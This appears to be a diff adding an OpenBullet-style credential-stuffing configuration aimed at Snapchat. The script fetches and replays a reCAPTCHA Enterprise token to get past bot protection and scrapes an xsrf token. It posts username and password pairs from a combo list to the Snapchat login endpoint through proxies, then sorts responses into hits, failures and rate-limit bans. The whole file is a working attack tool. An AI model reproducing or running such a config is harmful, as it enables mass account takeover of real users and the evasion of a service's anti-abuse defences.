@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "Snapchat",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-26T02:58:17.8456149+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "LaYayaw",
+  "Version": "EtriBullet",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#anchor REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&v=5mNs27FP3uLBP3KBPib88r1g&size=invisible&badge=inline&cb=8asu9n4eoxr7" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#recaptcha_token PARSE "<SOURCE>" LR "id=\"recaptcha-token\" value=\"" "\"" -> VAR "1" 
+
+#recaptcha REQUEST POST "https://www.google.com/recaptcha/enterprise/reload?k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw" 
+  CONTENT "reason=q&c=<1>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#rresp PARSE "<SOURCE>" LR "rresp\",\"" "\"" -> VAR "2" 
+
+#get_token REQUEST GET "https://accounts.snapchat.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#token PARSE "<SOURCE>" LR "xsrf=\"" "\"" -> VAR "token" 
+
+#login REQUEST POST "https://accounts.snapchat.com/accounts/login" 
+  CONTENT "username=<USER>&password=<PASS>&xsrf_token=<token>&continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome&g-recaptcha-response=<2>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "xsrf_token: <token>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Cannot find the user" 
+    KEY "not the right password" 
+  KEYCHAIN Success OR 
+    KEY "Change My Password" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+
